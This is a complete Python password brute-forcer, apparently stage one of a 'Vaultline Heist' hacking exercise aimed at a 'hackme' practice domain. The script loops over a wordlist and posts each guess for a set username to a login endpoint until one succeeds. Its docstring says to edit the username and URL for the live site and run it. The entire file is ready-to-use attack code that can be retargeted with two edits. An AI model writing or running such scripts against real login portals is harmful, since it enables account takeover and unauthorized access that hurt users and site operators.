"""
Vaultline Heist — password brute-forcer (Stage 1).

Tries each password from the wordlist against the login until one works.
Edit USERNAME (and URL for the live site), then run:  python brute_force.py
"""

import requests

USERNAME = "b.hollis"                              # your target's username
URL      = "https://hackme.smecworkspace.com/portal/login/"    # the login endpoint
WORDLIST = "tools/wordlist.txt"                      # the password list

print(f"[*] Brute-forcing {USERNAME} ...", flush=True)

tries = 0
for line in open(WORDLIST, encoding="latin-1", errors="ignore"):
    password = line.strip()
    tries += 1
    r = requests.post(URL, json={"username": USERNAME, "password": password})
    if r.json().get("success"):
        print(f"[+] FOUND after {tries} tries -> {password}")
        break
    print(f"[{tries}] tried: {password}", flush=True)   # live progress
else:
    print("[-] Not found. Wrong wordlist or username?")
